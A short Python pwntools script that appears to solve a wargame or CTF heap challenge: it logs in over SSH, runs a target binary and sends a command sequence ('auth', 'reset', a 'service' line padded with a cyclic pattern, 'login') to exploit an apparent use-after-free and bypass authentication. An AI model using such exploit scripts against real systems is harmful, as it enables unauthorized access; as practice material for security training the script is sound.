from pwn import *

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

with s.system(args.BIN) as p:
    p.recvline()
    p.sendline('auth x')
    p.recvline()
    p.sendline('reset')
    p.recvline()
    p.sendline('service' + cyclic(16))
    p.recvline()
    p.sendline('login')
    ret = p.recvline()
    assert ret == 'you have logged in already!\n'
